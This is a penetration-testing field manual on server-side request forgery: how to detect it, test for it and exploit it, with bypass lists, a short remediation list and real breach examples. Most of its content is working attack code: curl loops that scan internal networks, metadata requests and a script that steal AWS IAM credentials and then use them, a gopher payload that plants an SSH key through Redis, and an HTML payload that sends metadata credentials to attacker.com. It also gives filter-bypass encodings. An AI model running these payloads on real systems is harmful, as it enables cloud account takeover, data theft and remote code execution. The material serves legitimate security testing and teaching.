# A10: Server-Side Request Forgery (SSRF) — Field Manual

## 1. Overview

New entry in OWASP 2021 — #1 in community survey, placed at #10 with strong data support. SSRF occurs when an application fetches a remote resource using attacker-controlled URLs. Critical in cloud environments where metadata endpoints expose credentials.

**Why Dangerous:** Can access internal services, read cloud metadata (credentials), perform internal network scanning, achieve RCE in some configurations.

**CVSS Range:** 5.0 (limited blind SSRF) to 9.8 (SSRF → cloud metadata → credential theft → full account compromise)

**CWEs:** CWE-918

---

## 2. Detection Methods

### Manual Detection
```
1. Look for URL parameters: url=, link=, src=, dest=, redirect=, href=, path=
2. Look for fetch/import/callback functionality
3. Check document conversion: PDF, HTML, docx generators
4. Check integration endpoints: webhooks, Slack notif URLs, JIRA integration
5. SVG/HTML preview rendering
6. File import features (URL-based file import)
7. Request-level SSRF in XML/JSON bodies
8. Check all inputs that might trigger server-side HTTP requests
```

### Automated Detection
```bash
# Burp Suite Collaborator - best approach
# Replace URL values with Collaborator URL, watch for callbacks

# Nuclei SSRF templates
nuclei -u https://target.com -t vulnerabilities/ssrf/
nuclei -u https://target.com -t exposures/metadata/

# SSRFire
ssrfire -u "https://target.com/api?url=SSRF" -l 

# Interactsh (open-source Collaborator)
interactsh-client -v
# Gives you a unique URL, watches for callbacks
```

---

## 3. What to Look For

### URL Parameters
```
url=, link=, href=, src=, dest=, redirect=, uri=, path=, 
target=, site=, html=, callback=, payload=, next=, data=,
reference=, window=, domain=, proxy=, goto=, host=, file=,
open=, load=, feed=, fetch=, request=, return=, r=, u=
```

### Functionality Indicators
```
• PDF/screenshot generators: "Generate PDF report", "Export to PDF"
• Webhook configuration: "Enter webhook URL"
• URL preview/unfurl: Slack-like link previews
• Social login: OAuth redirect_uri
• File upload via URL: "Import from URL"
• API gateway/proxy endpoints
• Health check endpoints with configurable targets
• Headless browser services
• Image/video processing pipelines
• SAML SSO XML parsing
```

### Response Indicators
```
• Returned content from internal service
• Different response time (internal 10ms vs external 2000ms)
• DNS callback received (blind SSRF)
• HTTP callback received
• Error message revealing internal IP/hostname
• Connection timeout (different from public unreachable)
```

---

## 4. Testing Methodology

### Step 1: Identify SSRF Parameters
```bash
# Spider application, look for URL-accepting parameters
# In Burp: Proxy → HTTP history → filter for "url=\|src=\|link=\|href="
grep -E "url=|src=|link=|dest=|redirect=|href=" burp_history.txt | sort -u

# Check each endpoint for SSRF
# Replace URL value with your Burp Collaborator URL
# https://target.com/api/preview?url=https://COLLAB.burpcollaborator.net
```

### Step 2: Test Basic SSRF
```bash
# External callback (confirm SSRF exists)
curl "https://target.com/api/fetch?url=http://YOUR_BURP_COLLAB.burpcollaborator.net"
# Watch Burp Collaborator for HTTP/DNS callback

# Internal service probe
curl "https://target.com/api/fetch?url=http://localhost:80/"
curl "https://target.com/api/fetch?url=http://127.0.0.1:8080/"
curl "https://target.com/api/fetch?url=http://127.0.0.1:22/"

# Cloud metadata endpoint
curl "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/"
```

### Step 3: Internal Network Scanning
```bash
# Probe internal IP ranges
for ip in 10.0.0.{1..254} 172.16.0.{1..254} 192.168.1.{1..254}; do
  RESULT=$(curl -s -w "%{http_code}" -o /dev/null \
    "https://target.com/api/fetch?url=http://$ip/" \
    --max-time 5)
  echo "$ip: $RESULT"
done

# Port scan via SSRF
for port in 80 443 8080 8443 3306 5432 6379 9200 27017 22 21 25 3389; do
  RESULT=$(curl -s -w "%{http_code}" -o /dev/null \
    "https://target.com/api/fetch?url=http://10.0.0.1:$port" \
    --max-time 3)
  echo "Port $port: $RESULT"
done
```

### Step 4: Cloud Metadata Access
```bash
# AWS IMDSv1 (no auth required)
TARGET="https://target.com/api/fetch?url="
AWS_META="http://169.254.169.254"

# Get IAM credentials
curl "$TARGET$AWS_META/latest/meta-data/iam/security-credentials/"
curl "$TARGET$AWS_META/latest/meta-data/iam/security-credentials/ROLE_NAME"

# Get instance info
curl "$TARGET$AWS_META/latest/meta-data/"
curl "$TARGET$AWS_META/latest/meta-data/hostname"
curl "$TARGET$AWS_META/latest/meta-data/local-ipv4"
curl "$TARGET$AWS_META/latest/meta-data/public-ipv4"

# Get user-data (often contains secrets)
curl "$TARGET$AWS_META/latest/user-data"

# GCP metadata
curl "$TARGET" \
  + "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
# Requires: Metadata-Flavor: Google header — test without it first

# Azure IMDS
curl "$TARGET" \
  + "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
# Requires: Metadata: true header — test without it first

# DigitalOcean
curl "$TARGET/http://169.254.169.254/metadata/v1/interfaces/public/0/ipv4/address"
```

### Step 5: Blind SSRF Detection
```bash
# Use Burp Collaborator or interactsh
# Register: https://attacker.interactsh.com

# Test all user-controlled URL parameters
for endpoint in url link href src dest callback webhook; do
  curl "https://target.com/api" -d "$endpoint=http://$(uuid).interact.sh/"
done

# Time-based detection (when no callback possible)
# Internal host that responds: fast response (< 100ms)
# Internal host filtered: timeout (5s+)
# Non-existent host: timeout (5s+)
# But filtered vs non-existent differs by behavior

# DNS-based blind SSRF
curl "https://target.com/api?url=http://test.$(hostname).attacker.com/"
# Check DNS logs for resolution
```

---

## 5. Exploitation Techniques

### Cloud Metadata → Credential Theft → Lateral Movement
```bash
# Step 1: Exfiltrate IAM credentials via SSRF
RESPONSE=$(curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/")
ROLE_NAME=$(echo $RESPONSE | tr -d '\n')

CREDS=$(curl -s "https://target.com/api/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME")
echo $CREDS

# Step 2: Extract credentials
ACCESS_KEY=$(echo $CREDS | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['AccessKeyId'])")
SECRET_KEY=$(echo $CREDS | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['SecretAccessKey'])")
SESSION_TOKEN=$(echo $CREDS | python3 -c "import json,sys; d=json.load(sys.stdin); print(d['Token'])")

# Step 3: Use credentials
export AWS_ACCESS_KEY_ID=$ACCESS_KEY
export AWS_SECRET_ACCESS_KEY=$SECRET_KEY
export AWS_SESSION_TOKEN=$SESSION_TOKEN

aws sts get-caller-identity
aws s3 ls
aws ec2 describe-instances
aws secretsmanager list-secrets
```

### SSRF to RCE via Redis
```bash
# If internal Redis accessible
# Gopher protocol for raw TCP
# Write SSH key to Redis
curl "https://target.com/api?url=gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2458%0D%0A%0A%0Assh-rsa%20AAAA...YOUR_PUBLIC_KEY...%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2411%0D%0A/root/.ssh/%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%2215%0D%0Aauthorized_keys%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A"
```

### SSRF via PDF Generator
```html
<!-- Upload this HTML to a PDF generator service -->
<html>
<body>
  <iframe src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" 
          width="1000" height="1000"></iframe>
  <!-- Or use img with onload -->
  <img src="http://attacker.com/?data=" onload="
    fetch('http://169.254.169.254/latest/meta-data/iam/security-credentials/')
    .then(r=>r.text())
    .then(d=>location='http://attacker.com/?data='+btoa(d))
  "/>
</body>
</html>
```

### SSRF via SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" 
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" xmlns="http://www.w3.org/2000/svg">
  <!-- SSRF via xlink:href -->
  <image xlink:href="http://169.254.169.254/latest/meta-data/" x="0" y="0" height="100" width="200"/>
  <!-- Or external entity via href -->
  <use xlink:href="http://169.254.169.254/latest/meta-data/"/>
</svg>
```

### Internal Service Exploitation via SSRF
```bash
# Exploit internal unauthenticated services found via scanning

# Kubernetes API Server
curl "https://target.com/api?url=https://10.96.0.1/api/v1/namespaces/"
curl "https://target.com/api?url=https://10.96.0.1/api/v1/secrets/"

# Internal Elasticsearch
curl "https://target.com/api?url=http://10.0.0.5:9200/_cat/indices"
curl "https://target.com/api?url=http://10.0.0.5:9200/users/_search"

# Internal API without auth
curl "https://target.com/api?url=http://10.0.0.10/internal/admin/users"

# Docker socket (if web server in container)
curl "https://target.com/api?url=http://172.17.0.1:2375/containers/json"
curl "https://target.com/api?url=http://172.17.0.1:2375/v1.24/containers/json"
```

---

## 6. Verification

```
✓ External SSRF: Burp Collaborator received HTTP/DNS request from target server
✓ Internal SSRF: Different response for existing vs non-existing internal IP
✓ Cloud metadata: IAM credentials returned in response
✓ Port scan: Service banner/response received for open ports
✓ Redis RCE: SSH public key written, SSH login successful
✓ Blind SSRF: DNS resolution observed at attacker's DNS server
```

---

## 7. Common Problems & Solutions

| Problem | Cause | Fix |
|---------|-------|-----|
| http://169.254.169.254 blocked | AWS IMDSv2 or WAF | Try alternatives: 169.254.169.254, metadata.aws.internal, 2852039166 (decimal) |
| Redirect to localhost blocked | SSRF filter | Try 0.0.0.0, 0x7f000001, 127.1, 127.0.1, 0177.0.0.1 (octal) |
| DNS rebinding needed | IP validation at lookup time | Use DNS rebinding: resolve to legit IP first, then internal |
| Protocol blocked (gopher) | Allowlist check | Try dict://, file://, sftp://, tftp:// |
| No response returned | Blind SSRF | Use out-of-band (Burp Collaborator, interactsh) |
| IPv6 not filtered | Filter only checks IPv4 | Try [::1], [::ffff:127.0.0.1] |

---

## 8. Tools

```bash
# Burp Suite Collaborator (built-in)
# Generate payload: Burp → Burp Collaborator Client → Copy to clipboard

# Interactsh (open source alternative)
go install github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
interactsh-client -v  # Start listener, get unique domain

# SSRFmap
python3 ssrfmap.py -r request.txt -p url -m readfiles,portscan,metadata

# Gopherus - generate gopher:// payloads
python2 gopherus.py --exploit redis
python2 gopherus.py --exploit mysql
python2 gopherus.py --exploit smtp

# SSRF testing with ffuf
ffuf -u "https://target.com/api?url=FUZZ" \
  -w /opt/SecLists/SSRF/SSRF-targets.txt \
  -mc all -fc 400

# Nuclei
nuclei -u https://target.com -t vulnerabilities/ssrf/ -t exposures/metadata/

# Cloud metadata access
# Custom script for automated metadata extraction
for endpoint in \
  "latest/meta-data/" \
  "latest/meta-data/iam/security-credentials/" \
  "latest/user-data" \
  "latest/dynamic/instance-identity/document"; do
  echo "=== $endpoint ==="
  curl -s "https://target.com/api?url=http://169.254.169.254/$endpoint"
done
```

---

## 9. Bypass Techniques

### IP Address Bypass
```
Standard:           127.0.0.1
Decimal:            2130706433
Octal:              0177.0.0.1
Hex:                0x7f000001
Short IPv4:         127.1
Mixed formats:      127.0x0.0x0.1
IPv6 loopback:      [::1]
IPv6 mapped IPv4:   [::ffff:127.0.0.1]
DNS resolution:     localhost (resolves to 127.0.0.1)
Custom DNS:         attacker.com → 127.0.0.1
Alternate loopback: 127.0.0.2, 127.0.0.255 (all 127.x.x.x is loopback)

Cloud metadata bypasses:
169.254.169.254
169.254.169.253
0xA9FEA9FE          (hex)
2852039166          (decimal)
0251.0376.0251.0376 (octal)
[::ffff:169.254.169.254]
```

### Protocol Bypass
```
http://target            → try http://TARGET (uppercase)
file:///etc/passwd       → read local files
gopher://127.0.0.1:6379/ → raw TCP to Redis
dict://127.0.0.1:6379/   → RESP protocol
sftp://attacker.com      → SFTP to trigger DNS
tftp://attacker.com/x    → TFTP callback
ldap://attacker.com/     → LDAP callback
```

### Open Redirect → SSRF Bypass
```bash
# If application checks URL starts with https://
# And another endpoint has open redirect
# Chain: SSRF url = https://target.com/redirect?url=http://169.254.169.254/

# Or use shorteners if allowed
# Create: bit.ly/evil → http://169.254.169.254/

# 302 redirect to internal IP
# Host your own redirector:
# curl http://attacker.com/redirect → HTTP/1.1 302 Found, Location: http://169.254.169.254/

# DNS rebinding
# DNS record: A attacker.com → 1.2.3.4 (valid, passes check)
# After TTL=0, DNS record changes to 127.0.0.1
# Application checks IP at lookup, but fetches after rebind
```

### Whitelist Bypass
```
If only https://api.target.com allowed:
• https://api.target.com@evil.com
• https://evil.com?url=api.target.com
• https://api.target.com.evil.com
• https://api.target.com#evil.com (path fragment)

URL parsing confusion:
• http://evil.com\\@legitimate.com/
• http://legitimate.com:80@evil.com/
```

---

## 10. Remediation

```
1. Use allowlist of approved schemas (https only), hosts, and ports
2. Never accept user-controlled URLs for server-side fetching
3. Disable HTTP redirects in server-side requests
4. Enforce IMDSv2 for AWS EC2 (requires token, blocks SSRF)
5. Segment networks: application servers shouldn't reach metadata endpoints
6. Use DNS resolver that blocks RFC1918 addresses
7. Validate response: ensure returned content matches expected type
8. Log all SSRF targets for monitoring
9. Use security groups/firewall rules to limit egress
10. For cloud: use IAM role with minimal permissions
11. Validate and sanitize all URL inputs at application layer
12. Implement response validation: don't return raw content from fetched URLs
```

---

## 11. Real-World Examples

### Capital One Breach (2019) — $80M fine
- SSRF via WAF misconfiguration
- Accessed IMDSv1 → IAM credentials
- Downloaded 100M+ customer records from S3

### GitLab SSRF (CVE-2021-22214)
- CI pipelines could be used to perform SSRF
- Access to internal Kubernetes API
- CVSS 8.6

### SSRF in Confluence (CVE-2019-3395)
- WebDAV SSRF via user-controlled URL
- Access to internal network, cloud metadata
- CVSS 9.8

### Shopify SSRF → AWS Metadata (2018) — $25,000 bounty
- Webhook functionality allowed SSRF
- Access to 169.254.169.254 via redirect chain

### Twitch SSRF (2019) — $1,500 bounty
- Game directory feature fetched user-supplied URLs
- Internal service scanning via response timing
